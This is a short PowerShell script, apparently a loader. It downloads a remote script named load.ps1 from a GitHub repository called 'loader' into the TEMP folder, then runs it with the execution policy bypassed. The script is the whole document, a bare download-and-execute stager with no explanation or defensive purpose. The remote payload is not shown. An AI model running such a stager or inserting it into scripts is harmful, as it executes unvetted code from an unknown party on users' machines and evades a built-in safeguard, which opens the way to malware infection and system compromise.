$scriptUrl = "https://github.com/KevinDark5/loader/raw/refs/heads/main/load.ps1"
$tempFile = "$env:TEMP\\loadfile.ps1"
Invoke-WebRequest -Uri $scriptUrl -OutFile $tempFile
PowerShell -ExecutionPolicy Bypass -File $tempFile
